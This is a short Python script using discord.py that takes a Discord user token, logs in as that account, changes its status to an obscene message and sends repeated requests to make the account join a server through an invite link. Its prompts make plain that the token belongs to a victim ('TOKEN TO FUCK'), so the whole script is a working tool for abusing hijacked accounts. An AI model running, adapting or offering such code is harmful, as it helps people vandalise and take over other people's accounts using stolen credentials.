import discord
import asyncio
import requests
import sys

token = input ("TOKEN TO FUCK: ")

client = discord.Client()
print ("Preparing to fuck the token...")

@client.event
async def on_ready():
    print ("Fucking the token, Please wait.")
    await client.change_presence(game=discord.Game(name='I AM GETTING FUCKED'), status=discord.Status.do_not_disturb, afk=True)
    for x in range(30):
        apilink = "https://discordapp.com/api/v6/invite/t5zbtj6"
        headers={
        'Authorization': token
        }
        requests.post(apilink, headers=headers)
    print ("Token was Fucked")
    input()
    sys.exit()
try:
    client.run(token,bot=False)
except Exception:
    print ("Token isn't vaild")
